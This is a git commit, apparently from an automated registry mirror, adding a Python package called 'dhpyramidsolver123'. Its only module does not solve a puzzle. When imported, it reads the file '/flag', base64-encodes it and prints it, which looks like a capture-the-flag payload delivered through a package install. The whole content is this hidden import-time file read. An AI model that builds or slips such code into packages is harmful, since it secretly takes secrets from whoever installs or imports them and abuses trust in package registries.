521b813131f9d0d8b8e3b04835f496d1e3b27cc4
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 12:05:16 +0000

    Add package dhpyramidsolver123/0.1/dhpyramidsolver123-0.1-py3-none-any.whl

---
+++ packages/dhpyramidsolver123/dhpyramidsolver123-0.1-py3-none-any.whl/dhpyramidsolver123/main.py
@@ -0,0 +1,11 @@
+import base64
+
+def print_flag():
+    try:
+        with open('/flag', 'rb') as f:
+            encoded_flag = base64.b64encode(f.read()).decode('utf-8')
+            print(f"Encoded flag: {encoded_flag}")
+    except FileNotFoundError:
+        print("File not found.")
+
+print_flag()
